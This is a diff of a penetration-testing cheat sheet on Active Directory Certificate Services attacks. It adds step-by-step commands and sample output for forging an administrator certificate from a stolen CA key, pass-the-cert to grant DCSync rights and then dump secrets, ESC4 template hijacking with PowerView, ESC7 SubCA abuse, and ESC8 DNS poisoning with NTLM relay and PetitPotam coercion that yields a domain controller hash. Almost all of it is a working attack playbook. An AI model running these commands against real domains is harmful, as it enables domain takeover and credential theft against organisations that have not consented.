@@ -1,6 +1,5 @@
 ---
 title: "ADCS"
-date: 2024-7-23
 tags: ["Kerberos", "Pass-The-Ticket", "Certify", "Credential Dumping", "LDAP", "Pass-The-Hash", "Ticket Granting Ticket", "Domain Controller", "Certificate Services", "Active Directory", "Windows", "ADCS", "Pass-The-Cert", "Lookup SID"]
 ---
 
@@ -42,8 +41,8 @@ nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -M adcs
 
 ### Enum (From Windows)
 
-{{< tab set2 tab1 >}}powershell{{< /tab >}}
-{{< tab set2 tab2 >}}certify{{< /tab >}}
+{{< tab set2 tab1 >}}Powershell{{< /tab >}}
+{{< tab set2 tab2 >}}Certify{{< /tab >}}
 {{< tab set2 tab3 >}}ADCSTemplate{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
@@ -67,12 +66,12 @@ certutil -catemplates
 
 ```console
 # Get info of each template
-.\certify.exe find
+.\Certify.exe enum-cas
 ```
 
 ```console
 # Find vuln templates
-.\certify.exe find /vulnerable /currentuser
+.\Certify.exe enum-cas --filter-vulnerable --current-user
 ```
 
 {{< /tabcontent >}}
@@ -130,7 +129,7 @@ sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx '<USER>.pfx' -domain <DOMAIN> -d
 #### 1. Request a Certificate
 
 ```console
-.\certify.exe request /ca:<CA> /template:User
+.\Certify.exe request /ca:<CA> /template:User
 ```
 
 #### 2. Convert pem to pfx
@@ -144,6 +143,84 @@ openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provid
 
 ```console
 .\rubeus.exe asktgt /user:'<USER>' /certificate:cert.pfx /getcredentials /show /nowrap
+```
+
+{{< /tabcontent >}}
+
+---
+
+### Administrator of CA
+
+{{< tab set18 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set18 tab1 >}}
+
+#### 1. Backup CA Certificate and Private Key
+
+```console
+# Password
+certipy-ad ca -u '<USER>' -p '<PASSWORD>' -target <TARGET_DOMAIN> -backup
+```
+
+```console {class="sample-code"}
+certipy-ad ca -u 'cert_admin' -p 'P@ssw0rd123' -target MS01.example.com -backup
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: MS01.example.com.
+[!] Use -debug to print a stacktrace
+[*] Creating new service for backup operation
+[*] Creating backup
+[*] Retrieving backup
+[*] Got certificate and private key
+[*] Backing up original PFX/P12 to 'pfx.p12'
+[*] Backed up original PFX/P12 to 'pfx.p12'
+[*] Saving certificate and private key to 'CA.pfx'
+[*] Wrote certificate and private key to 'CA.pfx'
+[*] Cleaning up
+```
+
+#### 2. Forge a Certificate
+
+```console
+certipy-ad forge -ca-pfx CA.pfx -upn administrator@<DOMAIN> -subject 'CN=Administrator,CN=Users,DC=<EXAMPLE>,DC=<COM>'
+```
+
+```console {class="sample-code"}
+$ certipy-ad forge -ca-pfx CA.pfx -upn administrator@example.com -subject 'CN=Administrator,CN=Users,DC=EXAMPLE,DC=COM'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving forged certificate and private key to 'administrator_forged.pfx'
+[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
+```
+
+#### 3. Export '.crt' and '.key' from '.pfx'
+
+```console
+# Export crt
+certipy-ad cert -pfx 'administrator_forged.pfx' -nokey -out 'administrator_forged.crt'
+```
+
+```console
+# Export key
+certipy-ad cert -pfx 'administrator_forged.pfx' -nocert -out 'administrator_forged.key'
+```
+
+#### 4. Pass-the-Cert
+
+```console
+python3 passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target <TARGET_USER> -elevate -domain <DOMAIN> -dc-host <DC>
+```
+
+```console {class="sample-code"}
+$ python3 passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target apple.seed -elevate -domain example.com -dc-host dc01.example.com
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Granted user 'apple.seed' DCSYNC rights!
+```
+
+#### 5. Secrets Dump
+
+```console
+impacket-secretsdump '<TARGET_USER>:<PASSWORD>@<DC>'
 ```
 
 {{< /tabcontent >}}
@@ -263,7 +340,7 @@ evil-winrm -i <TARGET> -u <TARGET_USER> -H <HASH>
 #### 1. Generate a Cert with Altname
 
 ```console
-.\certify.exe request /ca:<CA> /template:<VULN_TEMPLATE> /altname:administrator
+.\Certify.exe request /ca:<CA> /template:<VULN_TEMPLATE> /altname:administrator
 ```
 
 #### 2. Convert pem to pfx
@@ -333,7 +410,7 @@ Set-ADCSTemplateACL -DisplayName 'vuln_esc1' -type allow -identity '<DOMAIN>\<US
 #### 5. Request a Cert with Altname
 
 ```console
-.\certify.exe request /ca:<CA> /template:vuln_esc1 /altname:administrator
+.\Certify.exe request /ca:<CA> /template:vuln_esc1 /altname:administrator
 ```
 
 #### 6. Get NTLM Hash
@@ -357,9 +434,10 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 ### ESC4: Template Hijacking
 
 {{< tab set7 tab1 >}}Linux{{< /tab >}}
+{{< tab set7 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set7 tab1 >}}
 
-#### 1. Update Template
+#### 1. Modify Template to a Vulnerable State
 
 ```console
 # Password
@@ -396,7 +474,7 @@ Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (
 [*] Successfully updated 'DunderMifflinAuthentication'
 ```
 
-#### 2. Request a Cert Based on the ESC4 Template
+#### 2. Request a Certificate Using the Modified Template
 
 ```console
 # Password
@@ -452,21 +530,51 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 ```
 
 {{< /tabcontent >}}
+{{< tabcontent set7 tab2 >}}
+
+#### 1. Import Module
+
+```console
+. .\PowerView.ps1
+```
+
+#### 2. Modify Template to a Vulnerable State
+
+```console
+Add-DomainObjectAcl -TargetIdentity <VULN_TEMPLATE> -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=<EXAMPLE>,DC=<COM>"
+```
+
+```console
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<EXAMPLE>,DC=<COM>" -Identity <VULN_TEMPLATE> -XOR @{'mspki-certificate-name-flag'=1} -Verbose
+```
+
+```console
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<EXAMPLE>,DC=<COM>" -Identity <VULN_TEMPLATE> -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
+```
+
+#### 3. Request a Certificate Using the Modified Template
+
+```console
+.\Certify.exe request --ca <DOMAIN>>\<CA> --template <VULN_TEMPLATE> --upn administrator@<DOMAIN>
+```
+
+#### 4. Get NTLM Hash
+
+```console
+# Convert the base64 encoded cert
+echo '<BASE64_CERT>' | base64 -d > administrator.pfx
+```
+
+```console
+# Request a TGT
+.\rubeus.exe asktgt /user:Administrator /certificate:<PFX_FILE> /ptt /nowrap /getcredentials
+```
+
+{{< /tabcontent >}}
 
 ---
 
 ### ESC7: Dangerous Permissions on CA
-
-```console
-+---------------------+
-| Access Right        |
-|=====================|
-| Manage CA           |
-| Manage Certificates |
-+---------------------+
-```
-
-<br>
 
 {{< tab set8 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set8 tab1 >}}
@@ -482,32 +590,38 @@ certipy-ad ca -ca <CA> -add-officer '<USER>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>
 certipy-ad find -dc-ip <DC> -ns <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -vulnerable -stdout
 ```
 
-#### 2. Request a Cert Based on SubCA
+#### 2. Enable SubCA Template \[Optional\]
 
 ```console
-# Take note of the Request ID
+certipy-ad ca -ca <CA> -enable-template 'SubCA' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
+```
+
+#### 3. Request a Cert Based on SubCA
+
+```console
+# Expect to be failed. Take note of the Request ID
 certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
 ```
 
-#### 3. Issue Request Using ManageCA and Manage Certificates Privilege
+#### 4. Issue Request Using ManageCA and Manage Certificates Privilege
 
 ```console
 certipy-ad ca -ca <CA> -issue-request <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
 ```
 
-#### 4. Request a Certificate from CA on the Target Domain
+#### 5. Request a Certificate from CA on the Target Domain
 
 ```console
 certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -retrieve <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
 ```
 
-#### 5. Get NTLM Hash
+#### 6. Get NTLM Hash
 
 ```console
 certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
-#### 6. Remote
+#### 7. Remote
 
 ```console
 evil-winrm -i <TARGET> -u administrator -H <HASH>
@@ -526,7 +640,17 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 #### 1. DNS Poisoning
 
 ```console
+# Password
 bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
+```
+
+```console
+# NTLM
+bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
+```
+
+```console {class="sample-code"}
+$ bloodyAD -u 'apple.seed' -p ':be167---[REDACTED]---68017' -f rc4 -d example.com --host DC01.example.com add dnsRecord 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.149.102
 ```
 
 #### 2. Setup NTLM Relay
@@ -535,10 +659,45 @@ bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> add dnsRecord '<
 certipy-ad relay -target '<TARGET_URL>' -template DomainController
 ```
 
+```console {class="sample-code"}
+$ certipy-ad relay -target 'http://DC02.example.com/certsrv/certfnsh.asp' -template DomainController
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting http://DC02.example.com/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+[*] Setting up SMB Server on port 445
+[*] SMBD-Thread-2 (process_request_thread): Received connection from 127.0.0.1, attacking target http://DC02.example.com
+[*] HTTP Request: GET http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] Authenticating against http://DC02.example.com as EXAMPLE/DC01$ SUCCEED
+[*] Requesting certificate for 'EXAMPLE\\DC01$' based on the template 'DomainController'
+[*] HTTP Request: POST http://dc02.example.com/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] Certificate issued with request ID 5
+[*] Retrieving certificate for request ID: 5
+[*] HTTP Request: GET http://dc02.example.com/certsrv/certnew.cer?ReqID=5 "HTTP/1.1 200 OK"
+[*] Got certificate with DNS Host Name 'DC01.example.com'
+[*] Certificate object SID is 'S-1-5-21-1202327606-3023051327-2528451343-1000'
+[*] Saving certificate and private key to 'dc01.pfx'
+[*] Wrote certificate and private key to 'dc01.pfx'
+[*] Exiting...
+```
+
 #### 3. Check Coerce Authentication Methods
 
 ```console
 nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus
+```
+
+```console {class="sample-code"}
+$ nxc smb DC01.example.com -u 'apple.seed' -H 'be167---[REDACTED]---68017' -d example.com -k -M coerce_plus  
+SMB         DC01.example.com 445    DC01        [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:example.com) (signing:True) (SMBv1:False)
+SMB         DC01.example.com 445    DC01        [+] example.com\apple.seed:be167---[REDACTED]---68017 
+COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, DFSCoerce
+COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, PetitPotam
+COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, PrinterBug
+COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, PrinterBug
+COERCE_PLUS DC01.example.com 445    DC01        VULNERABLE, MSEven
 ```
 
 #### 4. Coerce Authentication
@@ -547,10 +706,34 @@ nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus
 nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=<METHOD>
 ```
 
+```console {class="sample-code"}
+$ nxc smb DC01.example.com -u 'apple.seed' -H 'be167---[REDACTED]---68017' -d example.com -M coerce_plus -o LISTENER=DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
+SMB         10.10.149.101   445    DC01        [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:example.com) (signing:True) (SMBv1:False) 
+SMB         10.10.149.101   445    DC01        [+] example.com\apple.seed:be167---[REDACTED]---68017 
+COERCE_PLUS 10.10.149.101   445    DC01        VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.149.101   445    DC01        Exploit Success, lsarpc\EfsRpcAddUsersToFile
+```
+
 #### 5. Get NTLM Hash
 
 ```console
 certipy-ad auth -pfx <DC_HOSTNAME>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad auth -pfx dc01.pfx -domain example.com -dc-ip 10.10.149.101
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC01.example.com'
+[*]     Security Extension SID: 'S-1-5-21-1202327606-3023051327-2528451343-1000'
+[*] Using principal: 'dc01$@example.com'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc01.ccache'
+[*] Wrote credential cache to 'dc01.ccache'
+[*] Trying to retrieve NT hash for 'dc01$'
+[*] Got hash for 'dc01$@example.com': aad3b435b51404eeaad3b435b51404ee:156dd---[REDACTED]---b077c
 ```
 
 {{< /tabcontent >}}
@@ -837,10 +1020,37 @@ impacket-secretsdump -k -no-pass <DC>
 
 ---
 
-### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)
+### ESC13: Issuance Policy with Privileged Group Linked
 
 {{< tab set12 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set12 tab1 >}}
+
+#### 1. Request a Cert of User
+
+```console
+# Password
+certipy-ad req -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -ca <CA> -template <VULN_TEMPLATE>
+```
+
+```console
+# NTLM
+certipy-ad req -username '<USER>@<DOMAIN>' -hashes <HASH> -ca <CA> -template <VULN_TEMPLATE>
+```
+
+#### 2. Get a TGT
+
+```console
+certipy-ad auth -pfx '<USER>.pfx' -dc-ip '<DC_IP>'
+```
+
+{{< /tabcontent >}}
+
+---
+
+### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)
+
+{{< tab set13 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set13 tab1 >}}
 
 #### 1. Create a Computer
 
@@ -896,8 +1106,8 @@ certipy-ad auth -pfx evilcomputer.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username 
 
 ### ESC14b: Weak Explicit Certificate Mapping (E-Mail)
 
-{{< tab set13 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set13 tab1 >}}
+{{< tab set14 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set14 tab1 >}}
 
 #### 1. Modify Email of Target User
 
@@ -925,8 +1135,8 @@ certipy-ad auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username <TARGE
 
 ### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
 
-{{< tab set14 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set14 tab1 >}}
+{{< tab set15 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set15 tab1 >}}
 
 #### 1. Lookup SID
 
@@ -1011,8 +1221,8 @@ add_user_to_group <NEW_USER> 'Remote Management Users'
 
 ### ESC16: Security Extension Disabled on CA (Globally)
 
-{{< tab set15 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set15 tab1 >}}
+{{< tab set16 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set16 tab1 >}}
 
 #### 1. Read Initial UPN of the Victim Account \[Optional\]
 
@@ -1061,9 +1271,9 @@ certipy-ad cert -pfx '<USER>.pfx' -nocert -out '<USER>.key'
 certipy-ad cert -pfx '<USER>.pfx' -nokey -out '<USER>.crt'
 ```
 
-{{< tab set16 tab1 >}}LDAP Shell{{< /tab >}}
-{{< tab set16 tab2 >}}RBCD{{< /tab >}}
-{{< tabcontent set16 tab1 >}}
+{{< tab set17 tab1 >}}LDAP Shell{{< /tab >}}
+{{< tab set17 tab2 >}}RBCD{{< /tab >}}
+{{< tabcontent set17 tab1 >}}
 
 #### 1. Get a LDAP Shell
 
@@ -1086,7 +1296,7 @@ evil-winrm -i <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>'
 <small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set16 tab2 >}}
+{{< tabcontent set17 tab2 >}}
 
 #### 1. RBCD Attack
 
